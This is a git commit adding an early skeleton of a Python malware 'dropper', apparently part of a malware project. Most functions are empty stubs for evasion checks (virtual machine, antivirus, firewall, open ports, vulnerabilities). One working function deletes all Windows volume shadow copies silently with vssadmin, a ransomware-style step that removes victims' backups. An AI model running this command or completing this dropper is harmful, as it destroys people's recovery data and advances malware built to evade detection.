64d1b3e4bcd5d94e9de33d9ec20e797c790c7b75
tarcisio-marinho <tarcisio_marinho09@hotmail.com>
2018-09-20 17:38:23 -0300

    dropper basics

--- Dropper/dropper.py
+++ Dropper/dropper.py
@@ -1,1 +1,50 @@
+import os
 
+def get_os():
+    return os.name
+
+def list_process():
+    if(get_os() == 'nt'):
+        pass
+    elif(get_os() == 'posix'):
+        pass
+    else:
+        pass
+
+
+def check_running_process(process_name):
+    pass
+
+def check_is_VM():
+    pass
+
+def check_firewall():
+    pass
+
+def check_av():
+    pass
+
+def check_open_ports():
+    pass
+
+def check_vulns():
+    pass
+
+
+def delete_shadow_copies():
+    os.system('vssadmin.exe delete shadows /all /quiet')
+
+
+
+def menu():
+    if(get_os() == 'nt'):
+        pass
+    
+    elif(get_os() == "posix"):
+        pass
+    else:
+        pass
+
+
+if __name__ == "__main__":
+    menu()
